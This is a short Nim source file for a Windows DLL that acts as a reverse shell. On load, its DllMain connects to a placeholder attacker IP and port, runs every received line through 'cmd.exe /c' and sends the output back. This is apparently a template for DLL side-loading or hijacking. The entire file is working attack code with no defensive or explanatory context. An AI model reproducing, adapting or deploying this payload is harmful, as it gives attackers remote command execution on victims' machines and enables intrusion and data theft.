import winim/lean

import net, osproc, strformat

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
    NimMain()
                
    if fdwReason == DLL_PROCESS_ATTACH:
        let
            ip = "<IP_TO_REPLACE>"
            port = <PORT_TO_REPLACE>
            sock = newSocket()
            prompt = " > "
        
        sock.connect(ip, Port(port))

        while true:
            send(sock, prompt)
            let args = recvLine(sock)

            try:
                let cmd = execProcess(fmt"cmd.exe /c" & args)
                send(sock, cmd)
            
            except:
                break

    return true
